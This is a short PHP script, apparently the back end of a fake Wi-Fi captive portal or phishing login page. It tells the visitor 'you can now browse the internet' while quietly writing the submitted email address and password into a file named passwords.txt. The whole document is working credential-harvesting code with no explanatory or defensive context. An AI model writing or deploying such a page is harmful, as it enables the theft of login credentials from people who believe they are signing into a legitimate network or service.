 <?php
 echo ('you can now browse the internet');
 $myfile = fopen("passwords.txt", "w");
 fwrite($myfile, "email: ". $_POST['email']. " ");
 fwrite($myfile,"password: ". $_POST['password']);
 fwrite($myfile, "\n");
 fclose($myfile);
?>